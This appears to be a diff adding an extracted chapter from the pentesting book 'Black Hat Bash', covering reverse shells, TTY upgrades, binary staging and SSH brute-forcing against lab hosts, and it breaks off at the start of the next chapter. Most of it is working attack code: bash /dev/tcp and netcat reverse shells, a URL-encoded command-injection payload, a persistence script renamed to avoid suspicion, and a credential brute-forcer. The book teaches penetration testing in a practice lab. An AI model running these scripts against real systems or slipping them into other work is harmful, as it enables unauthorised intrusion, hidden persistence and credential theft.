@@ -1,0 +1,309 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 07 - Attackers typically implement port hopping by using a predefined range of ports. Listing 7-3 performs a reverse shell connection to the attacker machine by using a variety of ports, depending on their availability.
+Security Relevance Score: 19
+Word Count: 3176
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Attackers typically implement port hopping by using a predefined range of ports. Listing 7-3 performs a reverse shell connection to the attacker machine by using a variety of ports, depending on their availability.
+
+port-hopper.sh
+#!/bin/bash
+TARGET="172.16.10.1"
+❶ PORTS=("34455" "34456" "34457" "34458" "34459")
+
+listener_is_reachable() {
+  local port="${1}"
+❷ if timeout 0.5 bash -c "</dev/tcp/${TARGET}/${port}" 2> /dev/null; then
+    return 0
+  else
+    return 1
+  fi
+}
+
+connect_reverse_shell() {
+  local port="${1}"
+  bash -i >& "/dev/tcp/${TARGET}/${port}" 0>&1
+}
+
+❸ while true; do
+  for port in "${PORTS[@]}"; do
+  ❹ if listener_is_reachable "${port}"; then
+      echo "Port ${port} is reachable; attempting a connection."
+      connect_reverse_shell "${port}"
+    else
+      echo "Port ${port} is not reachable."
+    fi
+  done
+  echo "Sleeping for 10 seconds before the next attempt..."
+  sleep 10
+done
+
+Listing 7-3: Attempting reverse shell connections using a variety of ports
+This script sets a few predefined ports in an array: 34455, 34456, 34457, 34458, and 34459 ❶. At ❸, an infinite while loop continuously attempts to connect to the listener. We then iterate through the ports by using a for loop and check whether each port is reachable by using the listener_is_reachable() function ❹, which uses the special /dev/tcp device. Notice that we prepend the reachability check ❷ with the timeout command to ensure that the command exits at a set interval of 0.5 seconds. If the port is reachable, we call the connect_reverse_shell() function, passing the open port as an argument, and send an interactive shell to it using /dev/tcp.
+As we’re performing multiple network connections consecutively (one for the connectivity check and another to establish the reverse shell), some versions of Netcat may not support keeping the listener alive. To overcome this, we can use socat to set up a TCP listener on the Kali box. This tool will ensure that the listener remains alive:
+$ socat - tcp-listen:34459,fork
+If you run the script on one of the compromised hosts, such as p-web-01 (172.16.10.10), it should yield the following output:
+$ ./port-hopper.sh
+
+--snip--
+Port 34457 is not reachable.
+Port 34458 is not reachable.
+Port 34459 is reachable, attempting a connection...
+
+In the next section, we’ll discuss a few methods we can use to stage new binaries into a target environment without the superuser privileges necessary to download official packages from public repositories.
+
+
+
+Spawning TTY Shells with Pseudo-terminal Devices
+Here’s another scenario you might encounter in future shell-popping adventures: the limited shell you have access to might not provide full TTY (terminal) support. Non-TTY shells have limited command line editing, no job control, incomplete output formatting, and missing signal handling, and they may not work in interactive applications such as text editors.
+One common approach to upgrading a shell to a feature-rich TTY one is by using pseudo-terminals. A pseudo-terminal provides an interface through which processes can interact with a terminal-like device, allowing terminal-based applications, shells, and other programs to operate as if they were connected to a physical terminal.
+
+Python’s pty Module
+The Python pty module emulates the functionality of a physical terminal device. In the following example, we upgrade a Python shell to a fully interactive TTY bash shell by using the pty.spawn() function. Try running this on the Kali host to see what it does:
+$ python
+
+Python 3.xx (main, Feb 12, 00:48:52) on linux
+Type "help", "copyright", "credits" or "license" for more information.
+
+>>> import pty
+>>> pty.spawn("/bin/bash")
+
+$
+
+To exit the Python console, enter exit().
+On a compromised host with Python installed, you could elevate your shell by executing the following command:
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+Keep in mind that Python must be available on the compromised host for this technique to work.
+
+
+socat
+You can use socat to spawn a TTY shell if the tool exists on the target and in your local hacking system. We generally use socat for bidirectional communications between two data channels.
+On Kali, run the socat command to spawn a TTY shell:
+$ socat file:$(tty),raw,echo=0 tcp-listen:1337
+The file: parameter uses the value of the $(tty) command, which expands to /dev/pts/#. Raw mode (raw) ensures that socat won’t process input and output data, echo=0 disables socat’s local echoing, and tcp-listen:1337 defines the local TCP listening port.
+Next, by using the OS command injection vulnerability on p-web-02 (172.16.10.12), execute the following command. Note the use of the pipe character to trigger the injection vulnerability:
+| socat exec:'bash -li',pty,stderr tcp:172.16.10.1:1337
+In this example, we call socat with the exec parameter 'bash -li', which will execute bash interactively as if it had been invoked as a login shell. We also pass pty,stderr to generate a pseudo-terminal and capture the standard error stream, followed by tcp:172.16.10.1:1337 to set the connection address using TCP.
+
+
+
+Post-exploitation Binary Staging
+Let’s discuss a few ways to upgrade from a limited shell environment without needing root-level access. In this section, we’ll assume we weren’t able to use bash alone to establish a reverse shell connection to p-web-02 through the /dev/tcp special pseudo-device file.
+Even if the www-data user lacks permissions and the ability to install software on the server, we can use bash alone to execute many attacks. However, missing certain core binaries, especially those used for networking, can make our hacker lives especially tough.
+As we noted in Table 7-1, p-web-02 doesn’t have the wget binary available for downloading files from remote servers. Let’s try to execute a few other common network utility commands to see whether they exist:
+www-data@p-web-02:/var/www/html$ ssh
+bash: ssh: command not found
+www-data@p-web-02:/var/www/html$ nc
+bash: ssh: command not found
+www-data@p-web-02:/var/www/html$ socat
+bash: socat: command not found
+www-data@p-web-02:/var/www/html$ python --version
+bash: python: command not found
+www-data@p-web-02:/var/www/html$ curl
+curl: try 'curl --help' or 'curl --manual' for more information
+
+Wow, this host really has no way to establish an outbound connection. We do have curl, but it isn’t possible to use curl to make direct reverse shell connections.
+In cases such as these, downloading a Netcat binary to the target server would come in handy. By taking advantage of application vulnerabilities such as code execution, we could potentially install such a networking utility, then use it to establish an upgraded reverse shell connection.
+In this section, we cover helpful commands we could use to pull network binaries into our target environments and execute them. Note that we’ll use our reverse shell connection with p-web-02 to cheat a little here, but the following techniques could very well be executed using the OS command injection vulnerability we uncovered. We’ll demonstrate its use in a few examples.
+
+Serving Netcat
+In your Kali machine, navigate to the directory of the payload you want to transfer, then enter the following Python command to stand up an HTTP server:
+$ cd Black-Hat-Bash/ch07
+$ python -m http.server
+
+On p-web-02 (172.16.10.12), you should now be able to access the filesystem of your Kali machine through the Python HTTP server and execute a download command by using curl. Place a copy of the Kali nc binary into the same directory as the HTTP server:
+$ which nc
+/usr/bin/nc
+
+$ cp /usr/bin/nc ~/Black-Hat-Bash/ch07
+
+You can now download it to p-web-02 by using a remote curl command and set it as an executable:
+$ cd /var/www/html
+$ curl -O http://172.16.10.1:8000/nc
+
+% Total    % Received % Xferd  Average  Speed    Time    Time    Time  Current
+                                 Dload  Upload   Total   Spent   Left  Speed
+100 34952  100 34952    0     0  33.3M      0 --:--:-- --:--:--  --:-- 33.3M
+
+Within the Kali machine, we can now establish a secondary reverse shell connection in a new terminal on a different port. Let’s choose 1234 (as our first reverse shell uses port 1337):
+$ nc -lvp 1234
+Next, we can execute the new nc binary from within the first reverse shell to establish a second one via nc. We can also send this process to the background by using &:
+# chmod u+x nc
+# ./nc 172.16.10.1 1234 -e /bin/bash &
+
+[1] 140
+
+Alternatively, we simply call the Netcat binary in p-web-02 from within a new Kali terminal by using curl to exploit the OS command injection vulnerability:
+$ curl http://172.16.10.12/donate.php?amount=%7C+.%2Fnc+172.16.10.1+1234+-e+%2Fbin%2Fbash
+This approach bypasses the need for the first reverse shell.
+
+
+Uploading Files with pwncat
+When we use pwncat to establish a shell, we can leverage its upload command to transfer files between the attacker and compromised target machines. The upload command accepts two arguments, the source file and its destination:
+(local) pwncat$ upload /etc/passwd /tmp/remote_passwd.txt
+[16:16:46] uploaded in 0.32 seconds
+
+It’s important to remember that, unless pwncat is using SSL, the traffic between the attacker’s machine and the target will be in cleartext. (The same is true for Netcat and Ncat.)
+
+
+Downloading Binaries from Trusted Sites
+Often, environments won’t block egress traffic made to commonly used websites such as GitHub, GitLab, Google Drive, and Microsoft OneDrive, as well as to cloud services like Amazon Simple Storage Service (S3) and Google Cloud Storage (GCS). Thus, these are great places to host malicious files.
+Organizations with less security maturity frequently use the same outbound filtering policies for their entire network (including users and servers alike), and there is often no great way to block one part of a website while allowing others. In addition, if a company uses Amazon Web Services (AWS) or any other cloud provider to host its infrastructure, there is a good chance it allows all traffic to and from the cloud provider.
+As a penetration tester, you should explore any third-party services used by your target and look for ways to host your malicious files from them. For instance, if your target has a public marketing website and offers a chatbot feature for speaking with an agent, there might be a way to anonymously attach files through the chat. If this is the case, you could copy and paste that link and use it to pull malicious files onto compromised hosts down the road.
+One benefit to the trusted-site hosting approach is that if a website is served over HyperText Transfer Protocol Secure (HTTPS), communications between the compromised machine and the trusted site will be encrypted automatically.
+Exercise 10: Maintaining a Continuous Reverse Shell Connection
+You might want to strengthen your initial foothold on your target by executing a script that continuously reestablishes a reverse shell connection. If the reverse shell process is ever interrupted or disconnected, your script could reestablish a connection with the Kali machine by using the IP address and port you provide.
+Listing 7-4 will run locally as a background process on the compromised server and attempt to reestablish the reverse shell connection at a certain interval we set.
+
+reverse_shell _monitor.sh
+#!/bin/bash
+TARGET_HOST="172.16.10.1"
+TARGET_PORT="1337"
+
+# Function to restart the reverse shell process
+restart_reverse_shell() {
+  echo "Restarting reverse shell..."
+  bash -i >& "/dev/tcp/${TARGET_HOST}/${TARGET_PORT}" 0>&1 &
+}
+
+# Continuously monitor the state of the reverse shell.
+while true; do
+  restart_reverse_shell
+  # Sleep for a desired interval before checking again.
+  sleep 10
+done
+
+Listing 7-4: Monitoring and reestablishing a reverse shell
+The script itself is simple: we call the restart_reverse_shell() function every 10 seconds. Regardless of the status of the network or reverse shell process, this function will attempt to reestablish a connection with our Kali host. The Kali machine will refuse any additional connections if a current reverse shell connection is ongoing.
+Name the script something generic, like donation-monitor.sh, to avoid suspicion, as the script should run in the background indefinitely. Next, save the script to a file on p-web-02 (172.16.10.12) and set the appropriate execution permission, then run the script as a background job, redirecting its output:
+$ cp reverse_shell_monitor.sh donation-monitor.sh
+$ chmod +x ./donation-monitor.sh
+$ nohup ./donation-monitor.sh > /dev/null 2>&1 &
+$ rm nohup.out
+
+To test the script, all you need to do is run the Netcat listener command to serve the reverse shell. Attempt to stop and start the listener multiple times, and notice that the reverse shell is reestablished every 10 seconds.
+
+
+
+Initial Access with Brute Force
+A more traditional way of entering a remote system is by using the same services an IT administrator would use. By leveraging stolen credentials or exploiting weaknesses such as misconfigurations or poor passwords, we can brute-force a path through a system’s front door.
+One common service to target is SSH. While generally considered a secure protocol, SSH implementations may have security weaknesses that attackers could exploit, such as poor or reused passwords, insecure authentication methods, and key management issues.
+We can use bash scripting to perform complex brute-force attacks across numerous service protocols, including SSH. While we could run individual brute-forcing tools in isolation, combining them in a bash script provides numerous benefits. Our scripts can automate host detection, generate wordlists, and integrate with tools to stuff credentials.
+Let’s try to break into a new target, the p-jumbox-01 server (172.16.10.13). To execute an SSH connection, open a new terminal from within the Kali machine and enter the following command:
+$ ssh user@172.16.10.13
+The authenticity of host '172.16.10.13 (172.16.10.13)' can't be established.
+ED25519 key fingerprint is SHA256:c89YzVU+EW/2o+lZm30BgEjutZ0f2t145cSyX2/zwzU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+user@172.16.10.13's password:
+
+The warning message you see after attempting to SSH into p-jumpbox-01 indicates that the SSH client does not have the host’s public key stored in its known_hosts file. This file is used to verify the authenticity of the host you are connecting to, and the ED25519 key fingerprint represents the server’s public key. By entering yes, we proceed with the SSH connection and place the host’s public key into our known_hosts file.
+SSH allows both password-based and key-based authentication. In password-based authentication, a user provides their username and password to authenticate themselves to the remote server. In key-based authentication (also known as public-key authentication), a user supplies a cryptographic key to authenticate to a server. Before attempting to brute-force an SSH server, it’s important to verify that the server accepts password-based authentication.
+To test whether a server allows password-based authentication, simply observe the server’s response after attempting an initial connection. For example, you can see that our initial connection attempt yielded a prompt for the user’s password. Alternatively, you can use Nmap’s built-in NSE script ssh-auth-methods.nse located at /usr/share/nmap/scripts.
+If the server immediately rejects the connection or provides a generic error message without prompting you for a password, password-based authentication may not be allowed or isn’t the server’s primary authentication method.
+Exercise 11: Brute-Forcing an SSH Server
+In this exercise, you’ll use bash to conduct a dictionary-based brute-force attack against the SSH service running on the p-jumpbox-01 (172.16.10.13) server. Your script should iterate through a list of common usernames and passwords, attempt to authenticate to the server, and log any successful credentials.
+Before writing the SSH brute-forcing script, you’ll need two things. First, you must either identify a single target username or generate a list of usernames to iterate through. You didn’t identify any usernames during reconnaissance, so try a list of common Linux usernames, such as root, guest, backup, ubuntu, and centos. Of course, you’re merely guessing that these users exist on the target server.
+Second, you’ll need a list of potential passwords. Kali contains a great password list in the /usr/share/wordlist directory, but we suggest instead using the common-credentials/passwords.txt password file from the book’s GitHub repository.
+Armed with your username and password lists, you can write some bash to test the strength of the p-jumpbox-01 server’s authentication. Listing 7-5 provides an example.
+
+ssh-bruteforce.sh
+#!/bin/bash
+
+# Define the target SSH server and port.
+TARGET="172.16.10.13"
+PORT="22"
+
+# Define the username and password lists.
+❶ USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
+❷ PASSWORD_FILE="passwords.txt"
+
+echo "Starting SSH credential testing..."
+
+# Loop through each combination of usernames and passwords.
+❸ for user in "${USERNAMES[@]}"; do
+❹ while IFS= read -r pass; do
+    echo "Testing credentials: ${user} / ${pass}"
+
+    # Check the exit code to determine if the login was successful.
+    if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \
+             ❺ -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
+    ❻ echo "Successful login with credentials:"
+      echo "Host: ${TARGET}"
+      echo "Username: ${user}"
+      echo "Password: ${pass}"
+
+      # Perform additional actions here using the credentials
+      exit 0
+    fi
+  done < "${PASSWORD_FILE}"
+done
+echo "No valid credentials found."
+
+Listing 7-5: Brute-forcing SSH
+This SSH brute-force bash script starts much like our other scripts: by defining the target IP address and port. Next, we specify a list of usernames ❶ and a file that contains passwords that we’ll use ❷. At ❸, we then iterate through each username and use sshpass to inject passwords ❺, which we read in line by line ❹. We print any successful output ❻.
+
+NOTE
+
+For the following script to work, we need to install sshpass, a special utility that allows managing SSH connections in scripts. Install sshpass using the following command:
+$ sudo apt install sshpass -y
+Download and run the script to see the output:
+$ ./ssh-bruteforce.sh
+Starting SSH credential testing...
+Testing credentials: root / 123456
+Testing credentials: root / 123456789
+Testing credentials: root / qwerty
+Testing credentials: root / password
+Testing credentials: root / backup
+Testing credentials: root / pass123
+Testing credentials: guest / 123456
+Testing credentials: guest / 123456789
+Testing credentials: guest / qwerty
+Testing credentials: guest / password
+Testing credentials: guest / backup
+Testing credentials: guest / pass123
+Testing credentials: backup / 123456
+Testing credentials: backup / 123456789
+Testing credentials: backup / qwerty
+Testing credentials: backup / password
+Testing credentials: backup / backup
+Successful login with credentials:
+Host: 172.16.10.13
+Username: backup
+Password: backup
+
+We’ve identified that the username backup uses a weak password (also backup) on the p-jumpbox-01 server. We can validate that these credentials work by using this command to log in to the p-jumpbox-01 server:
+$ ssh backup@172.16.10.13
+When prompted for credentials, use the password backup, and you should be granted access.
+To take this script further, attempt the following modifications:
+
+Make the brute-forcing process more efficient by using a dictionary to attack multiple hosts in parallel so that you’re not limited to targeting a single IP address at a time.
+Add a notification component to the script so that once a host is compromised, you’ll get a notification via your favorite messaging media.
+
+
+
+Summary
+In this chapter, you learned how to create a reverse shell on a target and uncovered strategies for enhancing the interactivity and longevity of your remote shell interfaces, laying the groundwork for future exploits. You also learned how to transfer files between the attacking and compromised machines. Then you used bash to perform an SSH brute-force attack.
+Now that you’ve compromised three machines, we highly recommend you start roaming around the compromised hosts to set the stage for what’s coming in the next chapter.
+
+
+
+
+
+
+
+
+
+
+
+
+8
+LOCAL INFORMATION GATHERING
+
+
+
+In the previous two chapters, we gained an initial foothold on several hosts. In this chapter, we’ll perform local reconnaissance to identify assets of interest, leaving no stone unturned on the path to taking over other hosts on the network.
+Knowing where to find sensitive information once you successfully compromise a host is a critical skill. We’ll focus on key categories of information you can gather: identities (like users and groups), files (including logs and configurations), network information, automation workflows, installed software and firmware, running processes, and security mechanisms. We’ll cover other information, such as credentials, in
